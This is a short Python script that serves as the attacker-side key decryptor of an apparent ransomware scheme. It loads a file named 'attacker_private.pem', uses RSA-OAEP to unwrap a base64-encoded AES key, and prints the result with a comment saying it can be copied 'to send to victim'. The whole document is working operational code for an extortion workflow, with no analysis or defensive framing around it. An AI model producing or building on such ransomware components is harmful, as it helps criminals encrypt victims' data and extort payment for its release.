from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import base64

def decrypt_aes_key(encrypted_b64):
    try:
        # Load private key
        with open("attacker_private.pem", "rb") as f:
            private_key = RSA.import_key(f.read())

        # Prepare decryptor
        decryptor = PKCS1_OAEP.new(private_key)

        # Decode base64
        encrypted_bytes = base64.b64decode(encrypted_b64)

        # Decrypt AES key
        aes_key = decryptor.decrypt(encrypted_bytes)

        print("[+] Decrypted AES Key:")
        print(base64.b64encode(aes_key).decode())  # You can copy this to send to victim
        return aes_key

    except Exception as e:
        print(f"[!] Decryption failed: {e}")
        return None

if __name__ == "__main__":
    # Example usage
    b64_input = input("Paste Encrypted AES Key (Base64):\n")
    decrypt_aes_key(b64_input.strip())
